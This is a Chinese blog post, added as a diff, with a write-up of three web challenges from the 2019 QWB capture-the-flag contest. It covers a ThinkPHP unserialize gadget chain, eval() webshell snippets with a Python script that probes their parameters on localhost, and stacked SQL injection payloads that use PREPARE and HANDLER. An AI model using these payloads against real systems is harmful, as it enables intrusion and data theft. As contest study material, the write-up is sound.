@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="ruozhi">
+    
+    <meta name="description" content="Nothing...">
+    
+    
+    
+    
+    
+    
+    <title>强网杯部分 Web 笔记 | ruozhi</title>
+    <link href=”https://liey1.github.io“ rel=”prefetch” />
+
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/aos.js"></script>
+    <script src="/js/highslide/highslide-full.min.js"></script>
+    <link rel="stylesheet" href="/js/highslide/highslide.css">
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+</head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <div class="gal-menu gal-dropdown">
+    <div class="circle" id="gal">
+        <div class="ring">
+            <a href="https://liey1.github.io" class="menuItem" style="left: 50%; top: 15%;">首页</a>
+            
+            <a class="menuItem" style="left: 80.3109%; top: 32.5%;">下一页</a>
+            
+            <a href="/archives" class="menuItem" style="left: 80.3109%; top: 67.5%;">归档</a>
+            <a href="/plan" class="menuItem" style="left: 50%; top: 85%;">计划</a>
+            <a href="/essays" class="menuItem" style="left: 19.6891%; top: 67.5%;">随笔</a>
+            
+            <a class="menuItem" style="left: 19.6891%; top: 32.5%;">上一页</a>
+            
+        </div>
+        <audio id="audio" src="/imgs/oni.mp3"></audio>
+    </div>
+</div>
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="https://liey1.github.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">ruozhi</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/collections">
+                        <i class="fa fa-list"></i>收藏
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/web/">web</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/php/">php</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/ctf/">ctf</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://liey1.github.io">ruozhi</a>
+        >
+        <span>强网杯部分 Web 笔记</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2019/06/01/强网杯部分 Web 笔记/">强网杯部分 Web 笔记</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2019-06-01
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2019/06/01/强网杯部分 Web 笔记/">强网杯部分 Web 笔记</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2019-06-01
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web/">web</a>, 
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次强网杯只做出一道题。。。确实非常菜，但是 <code>WP</code> 看懂了三道，嘻嘻。这里做个总结吧。</p>
+<p>这里有个更好的 <code>WP</code>：<a href="https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">WP</a></p>
+<hr>
+<p>我也不知道题目名是啥，就用 <code>web1</code> <code>2</code> <code>3</code> 代替吧。。</p>
+<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>源码下载：<a href="http://bmob-cdn-21455.b0.upaiyun.com/2019/06/01/bb00bcb340229cc780d7ca8d4b36d5fd.gz" target="_blank" rel="noopener">web1</a></p>
+<p>这题是题反序列化的，其实很简单。</p>
+<p>看看思路：</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/06/01/dde89710406ac7bc802fad1a4d91c7f1.png" alt="此处输入图片的描述"></p>
+<p>一看，<code>TP5</code>，点开 <code>application</code>，可以看到个 <code>web</code> 模块，这里列一下文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">├── web</span><br><span class="line">│ ├── controller</span><br><span class="line">│ │ ├── Index.php</span><br><span class="line">│ │ ├── Login.php</span><br><span class="line">│ │ ├── Profile.php</span><br><span class="line">│ │ ├── Register.php</span><br></pre></td></tr></table></figure>
+<p>代码文件不多，我们随便翻翻，大致看了看会发现没什么危害点。</p>
+<p>然后我们很快就能注意到在 <code>Index.php</code> 的 <code>login_check</code> 函数中有这么两句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$profile=cookie(&apos;user&apos;);</span><br><span class="line">if(!empty($profile))&#123;</span><br><span class="line">    $this-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>没错，反序列化，第一个想到的 <code>__wakeup</code> 和 <code>__destruct</code>，再翻翻，我们很快就能翻到在 <code>Register.php</code> 里有全场唯一的 <code>__destruct</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!$this-&gt;registed)&#123;</span><br><span class="line">    $this-&gt;checker-&gt;index();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里调用了 <code>index</code> 函数，但是四个文件要不就没 <code>index</code>，要不就没啥用。但是我们很快又能看到在 <code>Profile.php</code> 中有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>没错， <code>__call</code> ，这个类又恰好没有 <code>index</code> 函数，所以我们有办法到这里来，先无视那个 <code>if</code> 条件，这个函数是调用当前类的任意函数，我们可以看看这个类里有什么有危害的函数。。。</p>
+<p>然后我们很快就能看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function upload_img()&#123;</span><br><span class="line">    if($this-&gt;checker)&#123;</span><br><span class="line">        if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/index&quot;;</span><br><span class="line">            $this-&gt;redirect($curr_url,302);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!empty($_FILES))&#123;</span><br><span class="line">        $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;</span><br><span class="line">        $this-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    if($this-&gt;ext) &#123;</span><br><span class="line">        if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br></pre></td></tr></table></figure>
+<p>第一个 <code>if</code> 我们可以先无视。我们先看看最后那个 <code>copy</code> 函数，这个函数的两个参数值分别是在上面那个 <code>if</code> 内赋值的，条件是：</p>
+<p><code>if(!empty($_FILES)){</code></p>
+<p>这里是判断是否上传了文件，也就是说：我们只要不上传文件，<code>filename_tmp</code> 和 <code>filename</code> 就不会被重新赋值，我们也就可以随意操作了。</p>
+<p>我的想法是先上传一张图片，然后在图片最后加一句话，然后再构造 <code>payload</code> 修改 图片后缀。</p>
+<p>这里贴一下我的 <code>payload</code> 就行了：</p>
+<p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2019/06/01/336eb76e4088aa6e80e3ca3c91ec99de.png" alt="此处输入图片的描述"></p>
+<p>我是直接再 <code>login_check</code> 构造的，主要是因为懒。</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>源码下载： <a href="http://bmob-cdn-21455.b0.upaiyun.com/2019/06/01/6a696c46409d2c44802d3e4e56c08193.gz" target="_blank" rel="noopener">web2</a></p>
+<p>这一题看，一大堆 <code>webshell</code>。但是大部分都是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;a&apos;] = &apos; &apos;;</span><br><span class="line">eval($_GET[&apos;a&apos;]);</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(&apos;a&apos;==&apos;b&apos;)</span><br><span class="line">eval($_GET[&apos;xixi&apos;]);</span><br></pre></td></tr></table></figure>
+<p>这两种，一开始我有个想法，就是把这两种全部替换掉，然后再放到安全狗里扫扫，但是这也太麻烦，于是我就没去做了。。</p>
+<p>赛后看 WP 发现可以把全部 <code>_GET</code> 和 <code>_POST</code> 提取出来，一个一个去试，这个想法确实方便很多。。贴上自己的 <code>jo</code> 本（参考了表哥们）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">webshell_dir = &apos;C:/wamp64/www/ctf/qiangwang/web2/src/&apos;</span><br><span class="line"></span><br><span class="line">webshells = os.listdir(webshell_dir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def request(url,get=&apos;&apos;,post=&apos;&apos;):</span><br><span class="line">	r = requests.get(url,params=get,data=post)</span><br><span class="line">	if r.text.find(&quot;ruozhi&quot;)&gt;0:</span><br><span class="line">		print(&quot;success : &quot;, url)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">def req(file,get_arr,post_arr):</span><br><span class="line">	cmd = &apos;echo &quot;ruozhi&quot;;&apos;;</span><br><span class="line">	web = &apos;http://127.0.0.1/ctf/qiangwang/web2/src/&apos;+file</span><br><span class="line">	get_arg = &#123;&#125;</span><br><span class="line">	post_arg = &#123;&#125;</span><br><span class="line">	for arg in get_arr:</span><br><span class="line">		get_arg[arg] = cmd</span><br><span class="line"></span><br><span class="line">	for arg in post_arr:</span><br><span class="line">		post_arg[arg] = cmd</span><br><span class="line"></span><br><span class="line">	request(web,get=get_arg,post=post_arg)</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def strip_quote(arr):</span><br><span class="line">	if arr == None:</span><br><span class="line">		return []</span><br><span class="line">	tmp = []</span><br><span class="line">	for i in arr:</span><br><span class="line">		tmp.append(i.strip(&quot;&apos;\&quot;&quot;))</span><br><span class="line">	return tmp</span><br><span class="line"></span><br><span class="line">def find_args(text):</span><br><span class="line">	get_args =strip_quote(re.findall(&quot;\$_GET\[(.*?)\]&quot;,text));</span><br><span class="line">	post_args =strip_quote(re.findall(&quot;\$_POST\[(.*?)\]&quot;,text));</span><br><span class="line">	return (get_args,post_args)</span><br><span class="line"></span><br><span class="line">for i in webshells:</span><br><span class="line">	print(&apos;find : &apos;,i)</span><br><span class="line">	f = open(webshell_dir+i,&apos;r&apos;)</span><br><span class="line"></span><br><span class="line">	(get_args,post_args) = find_args(&apos;&apos;.join(f.readlines()))</span><br><span class="line">	threading.Thread(target=req,args=(i,get_args,post_args,)).start()</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>这题过滤了 <code>select</code>，考的是堆叠注入，即： <code>select 1 ;select2</code></p>
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路 1"></a>思路 1</h2><p>这里丢几个思路，</p>
+<p>最先看到的：</p>
+<blockquote>
+<p>‘;use supersqli ; set @sql=concat(‘s’,’elect `flag` from `1919810931114514`‘);PREPARE stmt1 FROM @sql;EXECUTE stmt1;–</p>
+</blockquote>
+<p> 这是动态查询</p>
+<h2 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h2><p>然后第二个思路是从一开始分享的那个链接里看到的：</p>
+<ol>
+<li>通过将 <code>1919810931114514</code>（flag表） 表名修改为 <code>words</code>(默认的查询表)</li>
+<li>将flag 表里的的 <code>flag</code> 字段名 改成 <code>id</code></li>
+<li>然后 <code>1&#39;||&#39;1</code> 注入出全部数据就可以看到 <code>flag</code> 了</li>
+</ol>
+<h2 id="思路3"><a href="#思路3" class="headerlink" title="思路3"></a>思路3</h2><p>第三个思路是和表哥交流的时候学到的。</p>
+<blockquote>
+<p>1’;handler `1919810931114514` open;handler `1919810931114514` read first#</p>
+</blockquote>
+<p> 这个不是重点，表哥是这么说的：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们按着手册挨个试的</span><br><span class="line">很简单。。</span><br><span class="line">就几分钟</span><br><span class="line">就mysql手册</span><br></pre></td></tr></table></figure>
+<p> 手册链接：<a href="https://dev.mysql.com/doc/refman/5.7/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/handler.html</a></p>
+<p> 下次我也翻~啧</p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            ruozhi
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>Nothing…</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/01/强网杯部分 Web 笔记/">强网杯部分 Web 笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/05/02/四道 Code-Breaking Puzzles 的笔记/">四道 Code-Breaking Puzzles 的笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/02/20/unlink 的初级用法/">unlink 的初级用法</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/30/PHP 中绕过的小 TIPS/">PHP 中绕过的小 TIPS</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/17/Thinkphp5 的任意代码执行/">Thinkphp5 的任意代码执行</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/16/记一道 web 题/">记一道 web 题</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/12/02/VulnHub JIS-CTF/">VulnHub JIS-CTF</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/27/PWNABLE.kr --- simple login/">PWNABLE.kr --- simple login</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/27/LCTF bestphps_revenge 复现总结/">LCTF bestphps_revenge 复现总结</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/11/11/sql 注入的一些小姿势/">sql 注入的一些小姿势</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+                
+                <li class="">
+                    <a href="/2019/06/01/强网杯部分 Web 笔记/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
+                </li>
+                <li class="">
+                    <a href="/2019/06/01/强网杯部分 Web 笔记/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+            </ul>
+            <div class="tab-content">
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://mang0.me/" target="_blank">Mang0</a>
+    </li>
+    
+    <li>
+        <a href="http://zhanglingling.xyz/" target="_blank">张灵灵</a>
+    </li>
+    
+    <li>
+        <a href="https://yml-sec.top/friends/" target="_blank">夜莫离、</a>
+    </li>
+    
+</div>
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://www.baidu.com" target="_blank">百度</a>
+    </li>
+    
+    <li>
+        <a href="https://github.com" target="_blank">github</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com" target="_blank">知乎</a>
+    </li>
+    
+</div>
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 ruozhi Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+<script src="/js/activate-power-mode.js"></script>
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+<script src="/js/oni.js"></script>
+
+
+
+</html>
